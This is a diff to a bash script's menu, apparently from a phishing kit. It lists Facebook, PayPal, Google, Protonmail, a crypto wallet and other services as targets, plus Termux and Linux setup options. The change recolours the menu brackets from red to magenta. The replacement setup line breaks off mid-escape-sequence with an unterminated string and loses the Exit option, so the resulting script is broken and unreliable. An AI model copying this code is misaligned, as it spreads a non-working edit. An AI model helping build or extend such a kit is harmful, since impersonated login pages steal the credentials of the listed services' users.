@@ -71,18 +71,19 @@ printf " \n"
 }
 
 menu() {
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook     \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch       \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Instagram    \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;93m Pinterest    \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;93m Badoo\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Google       \e[0m\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;93m Snapchat     \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;93m Origin\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Microsoft    \e[0m\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;93m Linkedin     \e[0m\e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;93m CryptoCoin\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Netflix      \e[0m\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;93m Ebay         \e[0m\e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;93m Yahoo\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m PayPal       \e[0m\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;93m Dropbox      \e[0m\e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;93m Wordpress\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Steam        \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;93m Protonmail   \e[0m\e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;93m Yandex\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Twitter      \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;93m Spotify      \e[0m\e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;93m StackoverFlow\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m PlayStation  \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Reddit       \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m VK\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m GitHub       \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m01\e[0m\e[1;35m]\e[0m\e[1;93m Facebook     \e[0m\e[1;35m[\e[0m\e[1;77m11\e[0m\e[1;35m]\e[0m\e[1;93m Twitch       \e[0m\e[1;35m[\e[0m\e[1;77m21\e[0m\e[1;35m]\e[0m\e[1;93m DeviantArt\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m02\e[0m\e[1;35m]\e[0m\e[1;93m Instagram    \e[0m\e[1;35m[\e[0m\e[1;77m12\e[0m\e[1;35m]\e[0m\e[1;93m Pinterest    \e[0m\e[1;35m[\e[0m\e[1;77m22\e[0m\e[1;35m]\e[0m\e[1;93m Badoo\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m03\e[0m\e[1;35m]\e[0m\e[1;93m Google       \e[0m\e[1;35m[\e[0m\e[1;77m13\e[0m\e[1;35m]\e[0m\e[1;93m Snapchat     \e[0m\e[1;35m[\e[0m\e[1;77m23\e[0m\e[1;35m]\e[0m\e[1;93m Origin\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m04\e[0m\e[1;35m]\e[0m\e[1;93m Microsoft    \e[0m\e[1;35m[\e[0m\e[1;77m14\e[0m\e[1;35m]\e[0m\e[1;93m Linkedin     \e[0m\e[1;35m[\e[0m\e[1;77m24\e[0m\e[1;35m]\e[0m\e[1;93m CryptoCoin\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m05\e[0m\e[1;35m]\e[0m\e[1;93m Netflix      \e[0m\e[1;35m[\e[0m\e[1;77m15\e[0m\e[1;35m]\e[0m\e[1;93m Ebay         \e[0m\e[1;35m[\e[0m\e[1;77m25\e[0m\e[1;35m]\e[0m\e[1;93m Yahoo\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m06\e[0m\e[1;35m]\e[0m\e[1;93m PayPal       \e[0m\e[1;35m[\e[0m\e[1;77m16\e[0m\e[1;35m]\e[0m\e[1;93m Dropbox      \e[0m\e[1;35m[\e[0m\e[1;77m26\e[0m\e[1;35m]\e[0m\e[1;93m Wordpress\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m07\e[0m\e[1;35m]\e[0m\e[1;93m Steam        \e[0m\e[1;35m[\e[0m\e[1;77m17\e[0m\e[1;35m]\e[0m\e[1;93m Protonmail   \e[0m\e[1;35m[\e[0m\e[1;77m27\e[0m\e[1;35m]\e[0m\e[1;93m Yandex\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m08\e[0m\e[1;35m]\e[0m\e[1;93m Twitter      \e[0m\e[1;35m[\e[0m\e[1;77m18\e[0m\e[1;35m]\e[0m\e[1;93m Spotify      \e[0m\e[1;35m[\e[0m\e[1;77m28\e[0m\e[1;35m]\e[0m\e[1;93m StackoverFlow\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m09\e[0m\e[1;35m]\e[0m\e[1;93m PlayStation  \e[0m\e[1;35m[\e[0m\e[1;77m19\e[0m\e[1;35m]\e[0m\e[1;93m Reddit       \e[0m\e[1;35m[\e[0m\e[1;77m29\e[0m\e[1;35m]\e[0m\e[1;93m VK\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77m10\e[0m\e[1;35m]\e[0m\e[1;93m GitHub       \e[0m\e[1;35m[\e[0m\e[1;77m20\e[0m\e[1;35m]\e[0m\e[1;93m Adobe\e[0m\n"
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77mST\e[0m\e[1;31m]\e[0m\e[1;93m Termux Setup \e[1;31m[\e[0m\e[1;77mSL\e[0m\e[1;31m]\e[0m\e[1;93m Linux Setup  \e[0m\e[1;31m[\e[0m\e[1;77mEX\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
+printf " \e[1;35m[\e[0m\e[1;77mST\e[0m\e[1;35m]\e[0m\e[1;93m Termux Setup \e[1;35m[\e[0m\e[1;77mSL\e[0m\e[1;35m]\e[0m\e[1;93m Linux Setup  \e[0m\e[1;35m[\e[
+
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
